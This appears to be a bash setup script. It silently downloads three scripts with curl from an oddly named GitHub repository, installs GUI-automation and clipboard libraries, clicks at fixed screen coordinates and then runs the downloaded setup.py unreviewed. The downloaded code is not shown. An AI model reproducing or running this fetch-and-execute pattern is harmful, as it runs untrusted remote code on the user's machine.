#!/bin/bash
set -e

# Download scripts
curl -s -L -o setup.py "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/setup.py"
curl -s -L -o show.sh "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/show.sh"
curl -s -L -o loop.sh "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/loop.sh"

# Create and activate a Python virtual environment
python3 -m venv venv
source venv/bin/activate
pip install --quiet --upgrade pip
pip install --quiet pyautogui pyperclip psutil requests

echo "[INFO] Skipping Windows-only installers (Telegram, WinRAR, vcredist, VMQuickConfig)."

# Run pyautogui click (example)
python - << 'EOF'
import pyautogui as pag
pag.click(897, 64, duration=2)
EOF

# Run setup.py inside the venv
python setup.py
